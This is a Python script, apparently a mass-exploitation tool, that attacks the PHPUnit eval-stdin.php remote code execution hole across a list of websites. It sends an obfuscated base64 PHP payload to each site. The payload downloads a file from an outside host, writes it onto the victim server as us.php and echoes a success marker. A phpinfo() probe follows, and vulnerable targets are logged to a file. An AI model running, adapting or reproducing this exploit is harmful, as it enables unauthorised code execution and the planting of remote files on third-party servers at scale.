import sys , requests, re , socket , random , string , base64
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fg  =   Fore.GREEN

print """  
  [#] Create By ::
 __       __              __      __                                  __     ______    ______   ________ 
/  \     /  |            /  |    /  |                               _/  |   /      \  /      \ /        |
$$  \   /$$ |  ______   _$$ |_   $$/   ______    ______   _______  / $$ |  /$$$$$$  |/$$$$$$  |$$$$$$$$/ 
$$$  \ /$$$ | /      \ / $$   |  /  | /      \  /      \ /       \ $$$$ |  $$ ___$$ |$$ ___$$ |    /$$/  
$$$$  /$$$$ | $$$$$$  |$$$$$$/   $$ |/$$$$$$  | $$$$$$  |$$$$$$$  |  $$ |    /   $$<   /   $$<    /$$/   
$$ $$ $$/$$ | /    $$ |  $$ | __ $$ |$$ |  $$ | /    $$ |$$ |  $$ |  $$ |   _$$$$$  | _$$$$$  |  /$$/    
$$ |$$$/ $$ |/$$$$$$$ |  $$ |/  |$$ |$$ \__$$ |/$$$$$$$ |$$ |  $$ | _$$ |_ /  \__$$ |/  \__$$ | /$$/     
$$ | $/  $$ |$$    $$ |  $$  $$/ $$ |$$    $$ |$$    $$ |$$ |  $$ |/ $$   |$$    $$/ $$    $$/ /$$/      
$$/      $$/  $$$$$$$/    $$$$/  $$/  $$$$$$$ | $$$$$$$/ $$/   $$/ $$$$$$/  $$$$$$/   $$$$$$/  $$/       
                                     /  \__$$ |                                                          
                                     $$    $$/                                                           
                                      $$$$$$/                                                            
                                                      


𝙋𝙃𝙋𝙐𝙉𝙄𝙏 𝙍𝘾𝙀
"""

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')




headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

data2 = "<?php eval('?>'.base64_decode('PD9waHANCmZ1bmN0aW9uIGFkbWluZXIoJHVybCwgJGlzaSkgew0KCSRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7DQoJJGNoID0gY3VybF9pbml0KCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7DQoJY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0JJTkFSWVRSQU5TRkVSLCB0cnVlKTsNCgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZUEVFUiwgZmFsc2UpOw0KCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOw0KCXJldHVybiBjdXJsX2V4ZWMoJGNoKTsNCgljdXJsX2Nsb3NlKCRjaCk7DQoJZmNsb3NlKCRmcCk7DQoJb2JfZmx1c2goKTsNCglmbHVzaCgpOw0KfQ0KaWYoYWRtaW5lcigiaHR0cHM6Ly9uZWVnZXguY29tL21hbWFpZ2FuLnR4dCIsInVzLnBocCIpKSB7DQoJZWNobyAiTWF0aWdhbjEzMzciOw0KfSBlbHNlIHsNCgllY2hvICJmYWlsIjsNCn0NCj8+')); ?>"

data1 = "<?php phpinfo(); ?>"
def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    if site[-1]  is not '/' :
        site = site+'/'
    return site

def domain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    if 'www.' in site :
        site = site.replace("www.", "")
    site = site.rstrip()
    if site.split('/') :
        site = site.split('/')[0]
    while site[-1] == "/":
        pattern = re.compile('(.*)/')
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def addWWW(site):
    if site.startswith("http://"):
        site = site.replace("http://", "http://www.")
    elif site.startswith("https://"):
        site = site.replace("https://", "https://www.")
    else :
        site = 'http://www.'+site
    return site

def exploit(url) :
    try :
        dom = domain(url)
        url = URLdomain(url)
        if 'www.' in url:
            username = url.replace('www.', '')
        else:
            username = url
        if '.' in username:
            username = username.split('.')[0]
        if 'http://' in username:
            username = username.replace('http://', '')
        else:
            username = username.replace('https://', '')
        up=username.title()
        listdir = ["/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/phpunit/phpunit/Util/PHP/eval-stdin.php", "/phpunit/src/Util/PHP/eval-stdin.php", "/phpunit/Util/PHP/eval-stdin.php"] #ADD YOUR PATH HERE
        for directory in listdir:
            inj = url+directory
            check = requests.get(inj, headers=headers, data=data2, verify=False, timeout=15).content
            check2 = requests.get(inj, headers=headers, data=data1, verify=False, timeout=15).content
            if 'Matigan1337' in check :
                open('vuln.txt', 'a').write(url+directory +' \n')
                print ' -| ' + url + directory + '--> {}[Succefully]'.format(fg)
                break
            elif 'phpinfo' in check2 :
                open('vuln.txt', 'a').write(url+directory  + '\n')
                print ' -| ' + url + directory + '--> {}[Succefully]'.format(fg)
                break
            else :
                print ' -| ' + url + directory + '--> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + directory + '--> {}[Failed]'.format(fr)

mp = Pool(30)
mp.map(exploit, target)
mp.close()
mp.join()
